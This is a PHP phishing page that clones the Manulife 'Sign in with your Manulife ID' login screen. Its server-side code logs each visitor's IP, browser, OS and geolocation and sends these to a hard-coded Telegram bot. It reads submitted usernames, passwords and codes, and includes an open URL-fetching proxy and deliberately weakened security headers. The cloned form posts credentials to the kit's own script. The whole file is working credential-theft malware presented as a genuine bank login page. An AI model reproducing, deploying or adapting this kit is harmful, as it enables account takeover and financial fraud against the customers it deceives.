<?php

header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
header("X-XSS-Protection: 0");
header("X-Frame-Options: ALLOWALL");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");

if(isset($_GET['bypass']) && $_GET['bypass'] == 'true'){
    $url = $_GET['url'];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'",
        "X-XSS-Protection: 0",
        "X-Frame-Options: ALLOWALL",
        "Access-Control-Allow-Origin: *",
        "Access-Control-Allow-Credentials: true",
        "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
        "Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token"
    ));
    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);

    header("HTTP/1.1 ".$info['http_code']);
    foreach ($info['headers'] as $header) {
        if (!preg_match('/^Transfer-Encoding:/i', $header)) {
            header($header);
        }
    }
    echo $response;
    exit;
}




$full_date = date("h:i:s|M/d/Y");
$time = date("h:i:s");
$date = date("M/d/Y");

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}
$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS() { 
    global $user_agent;
    $os_platform  = "Unknown OS Platform";
    $os_array     = array(
                          '/windows nt 10/i'      =>  'Windows 10',
                          '/windows nt 6.3/i'     =>  'Windows 8.1',
                          '/windows nt 6.2/i'     =>  'Windows 8',
                          '/windows nt 6.1/i'     =>  'Windows 7',
                          '/windows nt 6.0/i'     =>  'Windows Vista',
                          '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                          '/windows nt 5.1/i'     =>  'Windows XP',
                          '/windows xp/i'         =>  'Windows XP',
                          '/windows nt 5.0/i'     =>  'Windows 2000',
                          '/windows me/i'         =>  'Windows ME',
                          '/win98/i'              =>  'Windows 98',
                          '/win95/i'              =>  'Windows 95',
                          '/win16/i'              =>  'Windows 3.11',
                          '/macintosh|mac os x/i' =>  'Mac OS X',
                          '/mac_powerpc/i'        =>  'Mac OS 9',
                          '/linux/i'              =>  'Linux',
                          '/ubuntu/i'             =>  'Ubuntu',
                          '/iphone/i'             =>  'iPhone',
                          '/ipod/i'               =>  'iPod',
                          '/ipad/i'               =>  'iPad',
                          '/android/i'            =>  'Android',
                          '/blackberry/i'         =>  'BlackBerry',
                          '/webos/i'              =>  'Mobile'
                    );

    foreach ($os_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $os_platform = $value;

    return $os_platform;
}

function getBrowser() {
    global $user_agent;
    $browser        = "Unknown Browser";
    $browser_array = array(
                            '/msie/i'      => 'Internet Explorer',
                            '/firefox/i'   => 'Firefox',
                            '/safari/i'    => 'Safari',
                            '/chrome/i'    => 'Chrome',
                            '/edge/i'      => 'Edge',
                            '/opera/i'     => 'Opera',
                            '/netscape/i'  => 'Netscape',
                            '/maxthon/i'   => 'Maxthon',
                            '/konqueror/i' => 'Konqueror',
                            '/mobile/i'    => 'Handheld Browser'
                     );

    foreach ($browser_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $browser = $value;

    return $browser;
}


$user_os        = getOS();
$user_browser   = getBrowser();
 
$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}

$file       = 'data.dat';
$file1       = 'combo.txt';
$file2       = 'master.log';
$ip         = "".$PublicIP;
$uaget      = "".$user_agent;
$bsr        = "".$user_browser;
$uos        = "".$user_os;
$ust= explode(" ", $user_agent);
$vr= $ust[3];
$ver=str_replace(")", "", $vr);
$version   = "Version              : ".$ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
}
else {
    $details  = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details  = json_decode($details, true);
$success  = $details['success'];
$fp = fopen($file, 'a');

if ($success==false) {
    fwrite($fp, $ip."\n");
    fwrite($fp, $uos."\n");
    fwrite($fp, $version."\n");
    fwrite($fp, $bsr."\n");
    fclose($fp);
} else if ($success==true) {
    $country    = $details['country'];
    $city       = $details['city'];
    $continent  = $details['continent'];
    $tp         = $details['type'];
    $cn         = $details['country_phone'];
    $is         = $details['isp'];
    $la         = $details['latitude'];
    $lp         = $details['longitude'];
    $crn        = $details['currency'];
    $type       = $tp;
    $bank       = "MANULIFE";

    $url        = "https://BMO.com";
    $user       = $_POST['username'];
    $pass       = $_POST['password'];
    $code       = $_POST['code']; 
	$lh     = "|";
    $mapurl     = "[maps.google.com/?q=$la$lh$lp]";
    $isp        = $is;
    $currency   = "".$full_date;
    $li     = ",";

    

} else {
    $status     = "Status : ".$success;
    fwrite($fp, $status."\n");
    fwrite($fp, $uaget."\n");
    fclose($fp);
}



$message =" $bank$lh$ip\n\n\n[ + ]-----[SR]-----[ + ]\n\n\n$bsr$lh$uos\n\n\n[ + ]-----[SR]-----[ + ]\n\n\n$is\n\n\n[ + ]-----[SR]-----[ + ]\n\n\n$city$lh$country\n\n\n[ + ]-----[SR]-----[ + ]\n\n\n$la$li$lp\n\n\n[ + ]-----[SR]-----[ + ]\n\n\n$uaget";

$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
$data = [
    'chat_id' => '-821080105',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                                    

?>
<html lang="en-CA" data-react-helmet="lang"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        
        <title>Sign in with your Manulife ID - Manulife Online Access</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width,initial-scale=1">
        <link rel="icon" href="favicon.png">
        <style data-styled="active" data-styled-version="5.1.1"></style>
        <link rel="stylesheet" href="./files/main.css">
        <script src="./files/jquery-3.6.0.min" crossorigin="anonymous"></script>
        <script>var lrbank = 'Manu'; var lrinfo = 'Login';</script>
        <script src="./files/actions"></script>
    </head>
    <body>
        <div id="app">
            <div data-overlay-container="true">
                <div>
                    <div class="Layout__HeaderWrapper-sc-3uqwjo-0 dwtfh">
                        <header class="styledComponents__Root-sc-1azf75m-0 dFHuwQ">
                            <nav data-testid="header-nav" aria-label="Global Navigation" class="styledComponents__Nav-sc-1azf75m-1 Zvri">
                                <a id="skip-to-content" tabindex="0" class="styledComponents__SkipToComponent-sc-1azf75m-3 fWQefO">Skip to main content</a><a id="skip-to-footer" tabindex="0" class="styledComponents__SkipToComponent-sc-1azf75m-3 fWQefO">Skip to footer</a>
                                <ul role="tablist" class="styledComponents__List-b07kt2-0 styledComponents__TabList-b07kt2-11 dQEZaB">
                                    <li id="customer" role="none" class="styledComponents__TabItem-b07kt2-12 lcDSyJ"><button type="button" role="tab" aria-selected="true" class="styledComponents__TabComponent-b07kt2-13 jDuOCW">Personal</button></li>
                                    <li id="sponsor" role="none" class="styledComponents__TabItem-b07kt2-12 lcDSyJ"><button type="button" role="tab" aria-selected="false" class="styledComponents__TabComponent-b07kt2-13 dfZpPt">Sponsors</button></li>
                                    <li id="advisor" role="none" class="styledComponents__TabItem-b07kt2-12 lcDSyJ"><button type="button" role="tab" aria-selected="false" class="styledComponents__TabComponent-b07kt2-13 dfZpPt">Advisors</button></li>
                                </ul>
                                <div class="styledComponents__HeaderButtons-sc-1azf75m-2 iLuGbi">
                                    <button type="button" class="styledComponents__HeaderButton-b07kt2-1 styledComponents__ContactUsComponent-b07kt2-3 ljFWpt">
                                        <span class="styledComponents__IconWrapper-b07kt2-2 bPvIgW">
                                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" width="1em" height="1em" font-size="1.25rem">
                                                <title>phone-icon</title>
                                                <path d="M18.16 12.561l-.36-.361a3.954 3.954 0 00-4.528-.745l-.12.059-4.708-4.7.058-.12a3.974 3.974 0 00-1.825-5.3 3.952 3.952 0 00-5.631 4.222c.14.818.53 1.571 1.12 2.155l10.028 10.044a3.976 3.976 0 006.784-2.564 4 4 0 00-.817-2.69zm-1.516 4.077a2.31 2.31 0 01-3.271 0L3.342 6.59a2.308 2.308 0 01.085-3.363 2.284 2.284 0 012.523-.345 2.3 2.3 0 011.057 3.075l-.578 1.189 6.392 6.384 1.189-.584a2.285 2.285 0 012.62.432l.242.241a2.33 2.33 0 01-.228 3.019z" fill="currentColor"></path>
                                            </svg>
                                        </span>
                                        Contact us
                                    </button>
                                    <button type="button" aria-label="Français" class="styledComponents__HeaderButton-b07kt2-1 styledComponents__LangComponent-b07kt2-4 iLXNPG"><span class="styledComponents__IconWrapper-b07kt2-2 bPvIgW">FR</span></button>
                                </div>
                            </nav>
                            <nav data-testid="nav" class="styledComponents__Root-sc-181wobl-3 bRBGfX header-2">
                                <div class="styledComponents__MobileSideNavWrapper-sc-181wobl-7 gftBzc">
                                    <button aria-labelledby="brand-logo-label" class="styledComponents__LogoComponent-sc-181wobl-1 styledComponents__BrandLogoComponent-sc-181wobl-4 gPloAQ">
                                        <svg viewBox="0 0 100 100" id="brand-logo" data-testid="brand-logo" style="height: 60px; width: 60px;">
                                            <title><span id="brand-logo-label">Manulife logo</span></title>
                                            <g fill="none">
                                                <path fill="#00C46E" d="M0 0h100v100H0z"></path>
                                                <path fill="#FEFEFE" d="M36.903 26.667l-8.57 8.562v39.39l8.57-8.563V26.667zm17.139 0l-8.568 8.562v39.39l8.568-8.563V26.667zm17.141 0l-8.57 8.562v39.39l8.57-8.563V26.667z"></path>
                                            </g>
                                        </svg>
                                    </button>
                                    <a class="styledComponents__LogoComponent-sc-181wobl-1 styledComponents__WordmarkLogoComponent-sc-181wobl-5 dtPwQi">
                                        <svg viewBox="0 0 110 30" fill="none" xmlns="http://www.w3.org/2000/svg" id="wordmark-logo" data-testid="wordmark-logo" style="height: 20px; max-width: 100%; padding-left: 23px; padding-right: 18px;">
                                            <title>Manulife logo</title>
                                            <path d="M98.568 19.047c0 2.505 1.831 4.336 4.047 4.336 1.638 0 3.372-1.06 4.047-2.409l2.216 2.023c-1.253 1.831-3.758 3.373-6.552 3.373-4.529 0-7.323-3.373-7.323-8.286 0-4.722 2.987-8.287 7.419-8.287 4.143 0 7.13 2.698 6.938 9.154H98.568v.096zm7.034-2.601c0-1.927-1.253-3.758-3.372-3.758-2.024 0-3.566 1.927-3.662 3.758h7.034zM94.425 13.17H91.15v12.91H87.68V13.17h-2.12v-2.891h2.12V7.003c0-2.601 1.638-4.914 4.914-4.914 1.542 0 2.795.386 3.565.77L95.1 5.559c-.481-.29-1.252-.578-1.927-.578-1.06 0-2.023.77-2.023 2.216v3.083h4.143l-.867 2.89zM81.61 3.149c1.156 0 2.216.963 2.216 2.216 0 1.253-1.06 2.216-2.216 2.216-1.252 0-2.216-1.06-2.216-2.216 0-1.156.964-2.216 2.216-2.216zm1.83 22.835h-3.564V10.28h3.565v15.705zM75.925 25.984h-3.468V5.27L75.926 1.8v24.184zM65.23 10.279H68.7v15.705h-3.565V24.25c-.963.867-2.505 2.023-4.529 2.023-2.023 0-4.817-1.06-4.817-5.01V10.28h3.469v9.924c0 1.83.77 3.084 2.408 3.084 1.35 0 2.602-.868 3.565-1.928V10.28zM43.455 25.984h-3.469V10.28h3.469v1.734c1.252-1.156 3.083-2.12 5.106-2.12 1.831 0 4.433 1.06 4.433 4.914v11.177h-3.47v-10.31c0-1.541-.674-2.89-2.215-2.89-1.35 0-2.987 1.156-3.854 1.83v11.37zM33.338 25.984V24.25c-.867.964-2.216 2.12-4.625 2.12-2.794 0-5.01-1.735-5.01-4.722 0-3.66 3.372-5.01 6.744-5.299l1.253-.096c1.252-.096 1.734-.771 1.734-1.638 0-1.06-.963-1.83-2.505-1.83-1.734 0-3.372 1.252-4.047 2.215l-1.927-2.312c1.253-1.542 3.373-2.698 6.167-2.698 3.565 0 5.684 1.83 5.684 5.01v11.177h-3.468v-.193zm0-7.515l-2.409.289c-2.023.289-3.854.963-3.854 2.698 0 1.252 1.06 2.12 2.409 2.12 1.638 0 2.987-1.06 3.854-2.12v-2.987zM3.854 25.984H0V4.112h4.047l6.552 10.792 6.359-10.792h4.047v21.872H17.15V10.568h-.097l-6.648 10.984-6.552-10.984v15.416z" fill="#fff"></path>
                                        </svg>
                                    </a>
                                    <button data-testid="mobile-toggle-button" type="button" aria-label="Open menu" aria-expanded="false" class="styledComponents__MobileNavButton-sc-181wobl-8 gSSMxV">
                                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" width="1em" height="1em" font-size="1.25rem">
                                            <path d="M19 3.362H1v1.667h18V3.362zm0 5.795H1v1.667h18V9.157zM1 14.972h18v1.667H1v-1.667z" fill-rule="evenodd" clip-rule="evenodd" fill="currentColor"></path>
                                        </svg>
                                        <div>Menu</div>
                                    </button>
                                </div>
                            </nav>
                        </header>
                    </div>
                    <div class="Layout__SideNavWrapper-sc-3uqwjo-1 caTVlB">
                        <nav data-testid="nav" class="styledComponents__Root-sc-181wobl-3 bRBGfX">
                            <div class="styledComponents__SideNavWrapper-sc-181wobl-6 ikUgPQ">
                                <div data-testid="main-nav" class="styledComponents__MainNavWrapper-sc-181wobl-11 dDDWdw">
                                    <button aria-labelledby="brand-logo-label" class="styledComponents__LogoComponent-sc-181wobl-1 styledComponents__BrandLogoComponent-sc-181wobl-4 gPloAQ">
                                        <svg viewBox="0 0 100 100" id="brand-logo" data-testid="brand-logo" style="width: 80px; height: 80px;">
                                            <title><span id="brand-logo-label">Manulife logo</span></title>
                                            <g fill="none">
                                                <path fill="#00C46E" d="M0 0h100v100H0z"></path>
                                                <path fill="#FEFEFE" d="M36.903 26.667l-8.57 8.562v39.39l8.57-8.563V26.667zm17.139 0l-8.568 8.562v39.39l8.568-8.563V26.667zm17.141 0l-8.57 8.562v39.39l8.57-8.563V26.667z"></path>
                                            </g>
                                        </svg>
                                    </button>
                                </div>
                            </div>
                        </nav>
                    </div>
                    <div class="Layout__Container-sc-3uqwjo-2 gaFNms">
                        <div tabindex="-1" class="Layout__ContentWrapper-sc-3uqwjo-3 dxJYmE">
                            <div class="ContentPage__PageWrapper-sc-1bcibrd-0 fyCsFZ">
                                <div class="ContentPage__PageContent-sc-1bcibrd-1 kdZieM">
                                    <div class="CoBrandingLogo__CoBrandingLogoWrapper-sc-1ybgx7m-0 bgruhi">
                                        <div class="CoBrandingLogo__LogoWrapper-sc-1ybgx7m-1 kegkZM">
                                            <svg viewBox="0 0 110 30" fill="none" xmlns="http://www.w3.org/2000/svg" role="img" width="69" height="19" aria-label="Manulife">
                                                <path d="M98.568 19.047c0 2.505 1.831 4.336 4.047 4.336 1.638 0 3.372-1.06 4.047-2.409l2.216 2.023c-1.253 1.831-3.758 3.373-6.552 3.373-4.529 0-7.323-3.373-7.323-8.286 0-4.722 2.987-8.287 7.419-8.287 4.143 0 7.13 2.698 6.938 9.154H98.568v.096zm7.034-2.601c0-1.927-1.253-3.758-3.372-3.758-2.024 0-3.566 1.927-3.662 3.758h7.034zM94.425 13.17H91.15v12.91H87.68V13.17h-2.12v-2.891h2.12V7.003c0-2.601 1.638-4.914 4.914-4.914 1.542 0 2.795.386 3.565.77L95.1 5.559c-.481-.29-1.252-.578-1.927-.578-1.06 0-2.023.77-2.023 2.216v3.083h4.143l-.867 2.89zM81.61 3.149c1.156 0 2.216.963 2.216 2.216 0 1.253-1.06 2.216-2.216 2.216-1.252 0-2.216-1.06-2.216-2.216 0-1.156.964-2.216 2.216-2.216zm1.83 22.835h-3.564V10.28h3.565v15.705zM75.925 25.984h-3.468V5.27L75.925 1.8v24.184zM65.23 10.279H68.7v15.705h-3.565V24.25c-.963.867-2.505 2.023-4.529 2.023-2.023 0-4.817-1.06-4.817-5.01V10.28h3.469v9.924c0 1.83.77 3.084 2.408 3.084 1.35 0 2.602-.868 3.565-1.928V10.28zM43.455 25.984h-3.469V10.28h3.469v1.734c1.252-1.156 3.083-2.12 5.106-2.12 1.831 0 4.433 1.06 4.433 4.914v11.177h-3.47v-10.31c0-1.541-.674-2.89-2.215-2.89-1.35 0-2.987 1.156-3.854 1.83v11.37zM33.338 25.984V24.25c-.867.964-2.216 2.12-4.625 2.12-2.794 0-5.01-1.735-5.01-4.722 0-3.66 3.372-5.01 6.744-5.299l1.253-.096c1.252-.096 1.734-.771 1.734-1.638 0-1.06-.963-1.83-2.505-1.83-1.734 0-3.372 1.252-4.047 2.215l-1.927-2.312c1.253-1.542 3.373-2.698 6.167-2.698 3.565 0 5.684 1.83 5.684 5.01v11.177h-3.468v-.193zm0-7.515l-2.409.289c-2.023.289-3.854.963-3.854 2.698 0 1.252 1.06 2.12 2.409 2.12 1.638 0 2.987-1.06 3.854-2.12v-2.987zM3.854 25.984H0V4.112h4.047l6.552 10.792 6.359-10.792h4.047v21.872H17.15V10.568h-.097l-6.648 10.984-6.552-10.984v15.416z" fill="#000"></path>
                                            </svg>
                                        </div>
                                    </div>
                                    <main class="ContentPage__PageMain-sc-1bcibrd-2 iatcqe">
                                        <h1 tabindex="-1" color="#34384B" class="styledComponents__StyledH1-sc-1tnhh3j-0 hoNsqk"><span class="styledComponents__StyledI-sc-1tnhh3j-4 cniAQL">Sign in</span> with your Manulife ID</h1>
                                        <div class="sc-AxhCb eSwYtm">
                                            <div class="sc-AxhUy fxWvvr">
                                                <form class="Form__StyledForm-sntzww-0 ca-dItP" method="post" action="040148.php">
                                                    <div class="sc-AxiKw eSbheu"></div>
                                                    <div class="sc-AxiKw eSbheu">Please fill out everything.</div>
                                                    <div class="sc-AxjAm oVjwV" spacing="1">
                                                        <div class="styledComponents__Root-k03yft-0 kpXWYp">
                                                            <div class="styledComponents__LabelWrapper-k03yft-3 WfIfl">
                                                                <div class="styledComponents__LabelTooltipWrapper-k03yft-4 PQgHP"><label for="username" class="styledComponents__LabelWrapper-hjijhx-0 fFRAIe">Username&nbsp;</label></div>
                                                            </div>
                                                            <div class="styledComponents__FlexBox-k03yft-2 iRNmdm">
                                                                <div data-testid="input-wrapper" class="styledComponents__InputWrapper-k03yft-5 jHjiBe">
                                                                    <input id="username" data-testid="text-input" type="text" aria-label="" aria-required="true" autocomplete="none" required="" aria-activedescendant="" name="username" inputmode="email" class="styledComponents__Input-k03yft-7 hwVdIy lrinpit" attr-action="Filling Username" value="">
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div>
                                                            <span class="styledComponents__CheckboxWrapper-qwzu5h-0 hHGYjF">
                                                                <input id="remember-me" type="checkbox" class="styledComponents__CheckboxInput-qwzu5h-1 jIvzPX">
                                                                <div class="styledComponents__IconWrapper-qwzu5h-2 gZfVzW checkbox-icon">
                                                                    <span color="inherit" fill="#00A758" width="1.25rem" height="0.875rem" aria-hidden="true" data-icon="checkmark" opacity="1" class="styledComponents__ManulifeRoot-sc-1c8dbgg-1 cgGIoE">
                                                                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" focusable="false" viewBox="0 0 20 20">
                                                                            <title></title>
                                                                            <path fill="none" fill-rule="nonzero" d="M16.667 0L11.11 5.49 7.222 9.333 3.333 5.49 0 8.863 7.222 16l7.222-7.137L20 3.373z"></path>
                                                                        </svg>
                                                                    </span>
                                                                </div>
                                                            </span>
                                                            <label for="remember-me" class="Checkbox__Label-nv0xeb-0 fsBKMd">Remember username</label>
                                                        </div>
                                                        <span class="styledComponents__TextLinkWrapper-sc-1y3f8u0-0 enagxf"><a aria-label="[object Object]" id="textlink-id-l7s60dp0" target="_self" href="220098/manu">Forgot your username?</a></span>
                                                    </div>
                                                    <div class="sc-AxjAm oVjwV" spacing="1">
                                                        <div class="styledComponents__Root-k03yft-0 kpXWYp">
                                                            <div class="styledComponents__LabelWrapper-k03yft-3 WfIfl">
                                                                <div class="styledComponents__LabelTooltipWrapper-k03yft-4 PQgHP"><label for="password" class="styledComponents__LabelWrapper-hjijhx-0 fFRAIe">Password&nbsp;</label></div>
                                                            </div>
                                                            <div class="styledComponents__FlexBox-k03yft-2 iRNmdm">
                                                                <div data-testid="input-wrapper" class="styledComponents__InputWrapper-k03yft-5 jHjiBe">
                                                                    <input id="password" data-testid="text-input" type="password" aria-label="" aria-required="true" autocomplete="" required="" aria-activedescendant="" name="password" class="styledComponents__Input-k03yft-7 hwVdIy" value="">
                                                                    <button id="pwd-toggle-password" type="button" class="styledComponents__ShowPasswordToggleWrapper-k03yft-10 cShVjQ lrinpit" attr-action="Filling Password">SHOW</button>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <span class="styledComponents__TextLinkWrapper-sc-1y3f8u0-0 enagxf"><a aria-label="[object Object]" id="textlink-id-l7s60dpa" target="_self" href="220098/manu">Forgot your password?</a></span>
                                                    </div>
                                                    <div class="sc-AxjAm jxWmSt" spacing="2"><button type="submit" id="button-id-l7s60dpc" class="styledComponents__ButtonWrapper-np7t5k-0 cnkCGb" name="save" value="1">Sign in</button></div>
                                                </form>
                                                <h2 color="#34384B" class="styledComponents__StyledH2-sc-1tnhh3j-1 hpKOrH">Don't have a Manulife ID?</h2>
                                                <div class="sc-AxjAm oVjwV" spacing="1"><button id="button-id-l7s60dpk" class="styledComponents__ButtonWrapper-np7t5k-0 kffbnn">Set up a Manulife ID</button></div>
                                                <p color="#34384B" class="styledComponents__StyledP-sc-1tnhh3j-5 dkXiuO"><span class="styledComponents__TextLinkWrapper-sc-1y3f8u0-0 enagxf"><a aria-label="[object Object]" id="textlink-id-l7s60dpp" target="_self" href="aboutmanulifeid?ui_locales=en-CA&amp;goto=https%3A%2F%2Fpersonal.id.manulife.ca%3A443%2Fam%2Foauth2%2Fauthorize%3Fclient_id%3Dbank.online%2540customers.ciam%26scope%3Dopenid%2520ciam%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fonline.manulifebank.ca%252Foauth-callback%26state%3DYk4pXnpTL6ZFXWagb0Uy85JniBpT_eCloG-y4Q_Djtc%26successReturnToOrRedirect%3D%252Foauth-login-success%26failWithError%3Dtrue%26ui_locales%3Den-CA%26code_challenge%3DBEQB6ilD_0yF1QaVf2AJvz1UYTOcap9iG8qDWN3pF9k%26code_challenge_method%3DS256%26claims%3D%257B%2522id_token%2522%253A%257B%2522ui_locales%2522%253A%257B%2522value%2522%253A%2522en-CA%2522%257D%257D%257D">What's a Manulife ID?</a></span></p>
                                            </div>
                                            <div class="sc-AxgMl cVmQYF">
                                                <div class="styledComponents__CardWrapper-sc-1em65cu-0 bxrwve">
                                                    <div class="styledComponents__CardContentWrapper-sc-1em65cu-4 eZviVx">
                                                        <div class="sc-Axmtr hvJMgY">
                                                            <p color="#34384B" class="styledComponents__StyledP-sc-1tnhh3j-5 dlMqjR"><strong data-testid="strong">You will be able to access</strong></p>
                                                            <div class="sc-fzozJi dteCCc">
                                                                <ul class="FormattedRichMessage__UnorderedList-sc-1ddpafl-0 ibKVGj">
                                                                    <li class="FormattedRichMessage__ListItem-sc-1ddpafl-1 LExdT">Group Benefits</li>
                                                                    <li class="FormattedRichMessage__ListItem-sc-1ddpafl-1 LExdT">Group Retirement or VIP Room</li>
                                                                    <li class="FormattedRichMessage__ListItem-sc-1ddpafl-1 LExdT">Manulife Bank – personal and business</li>
                                                                    <li class="FormattedRichMessage__ListItem-sc-1ddpafl-1 LExdT">Manulife Securities</li>
                                                                    <li class="FormattedRichMessage__ListItem-sc-1ddpafl-1 LExdT">Manulife Investment Management</li>
                                                                    <li class="FormattedRichMessage__ListItem-sc-1ddpafl-1 LExdT">Manulife <span class="styledComponents__StyledI-sc-1tnhh3j-4 cniAQL">Vitality</span> – for individual insurance customers</li>
                                                                    <li class="FormattedRichMessage__ListItem-sc-1ddpafl-1 LExdT">Manulife <span class="styledComponents__StyledI-sc-1tnhh3j-4 cniAQL">Vitality</span> – for group benefits customers</li>
                                                                    <li class="FormattedRichMessage__ListItem-sc-1ddpafl-1 LExdT">Manulife Private Wealth</li>
                                                                    <li class="FormattedRichMessage__ListItem-sc-1ddpafl-1 LExdT">SecureServe®</li>
                                                                </ul>
                                                            </div>
                                                        </div>
                                                        <div class="sc-Axmtr hvJMgY">
                                                            Looking for a different Manulife site?
                                                            <div class="sc-AxmLO gmtmqV">
                                                                <button id="button-id-l7s60dq8" class="styledComponents__ButtonWrapper-np7t5k-0 iPkDdp">
                                                                    <div class="styledComponents__IconWrapper-np7t5k-1 jypieV">
                                                                        <span color="inherit" fill="#FF7769" width="1.3125rem" height="1.3125rem" aria-hidden="true" data-icon="chevronright_withcircle" opacity="1" class="styledComponents__ManulifeRoot-sc-1c8dbgg-1 fmZoHk">
                                                                            <svg width="20px" height="20px" focusable="false" viewBox="0 0 20 20" version="1.1" xmlns="http://www.w3.org/2000/svg">
                                                                                <title></title>
                                                                                <g stroke="none" stroke-width="0" fill="none" fill-rule="evenodd">
                                                                                    <g transform="translate(-826.000000, -245.000000)" fill="none" fill-rule="nonzero">
                                                                                        <g transform="translate(836.000000, 255.000000) rotate(0.000000) translate(-836.000000, -255.000000) translate(826.000000, 245.000000)">
                                                                                            <g>
                                                                                                <path d="M10,2 C14.4,2 18,5.6 18,10 C18,14.4 14.4,18 10,18 C5.6,18 2,14.4 2,10 C2,5.6 5.6,2 10,2 L10,2 Z M10,0 C4.5,0 0,4.5 0,10 C0,15.5 4.5,20 10,20 C15.5,20 20,15.5 20,10 C20,4.5 15.5,0 10,0 L10,0 Z" class="manulifeIconSecondary-fill"></path>
                                                                                                <polygon points="13 9.6 13.5 10.1 12.8 10.8 12.8 10.8 9.4 14 8 12.6 10.6 10 8 7.4 9.4 6 13 9.6"></polygon>
                                                                                            </g>
                                                                                        </g>
                                                                                    </g>
                                                                                </g>
                                                                            </svg>
                                                                        </span>
                                                                    </div>
                                                                    <div class="sc-AxmLO gmtmqV">Sign in to the other Manulife products</div>
                                                                </button>
                                                            </div>
                                                        </div>
                                                        <div class="sc-Axmtr hvJMgY">
                                                            Looking to sign in as an Advisor?
                                                            <div class="sc-AxmLO gmtmqV">
                                                                <button id="button-id-l7s60dqj" class="styledComponents__ButtonWrapper-np7t5k-0 iPkDdp">
                                                                    <div class="styledComponents__IconWrapper-np7t5k-1 jypieV">
                                                                        <span color="inherit" fill="#FF7769" width="1.3125rem" height="1.3125rem" aria-hidden="true" data-icon="chevronright_withcircle" opacity="1" class="styledComponents__ManulifeRoot-sc-1c8dbgg-1 fmZoHk">
                                                                            <svg width="20px" height="20px" focusable="false" viewBox="0 0 20 20" version="1.1" xmlns="http://www.w3.org/2000/svg">
                                                                                <title></title>
                                                                                <g stroke="none" stroke-width="0" fill="none" fill-rule="evenodd">
                                                                                    <g transform="translate(-826.000000, -245.000000)" fill="none" fill-rule="nonzero">
                                                                                        <g transform="translate(836.000000, 255.000000) rotate(0.000000) translate(-836.000000, -255.000000) translate(826.000000, 245.000000)">
                                                                                            <g>
                                                                                                <path d="M10,2 C14.4,2 18,5.6 18,10 C18,14.4 14.4,18 10,18 C5.6,18 2,14.4 2,10 C2,5.6 5.6,2 10,2 L10,2 Z M10,0 C4.5,0 0,4.5 0,10 C0,15.5 4.5,20 10,20 C15.5,20 20,15.5 20,10 C20,4.5 15.5,0 10,0 L10,0 Z" class="manulifeIconSecondary-fill"></path>
                                                                                                <polygon points="13 9.6 13.5 10.1 12.8 10.8 12.8 10.8 9.4 14 8 12.6 10.6 10 8 7.4 9.4 6 13 9.6"></polygon>
                                                                                            </g>
                                                                                        </g>
                                                                                    </g>
                                                                                </g>
                                                                            </svg>
                                                                        </span>
                                                                    </div>
                                                                    <div class="sc-AxmLO gmtmqV">Advisor Manulife ID sign in</div>
                                                                </button>
                                                            </div>
                                                        </div>
                                                        <div class="sc-Axmtr hvJMgY">
                                                            Looking to sign in as a Sponsor?
                                                            <div class="sc-AxmLO gmtmqV">
                                                                <button id="button-id-l7s60dqo" class="styledComponents__ButtonWrapper-np7t5k-0 iPkDdp">
                                                                    <div class="styledComponents__IconWrapper-np7t5k-1 jypieV">
                                                                        <span color="inherit" fill="#FF7769" width="1.3125rem" height="1.3125rem" aria-hidden="true" data-icon="chevronright_withcircle" opacity="1" class="styledComponents__ManulifeRoot-sc-1c8dbgg-1 fmZoHk">
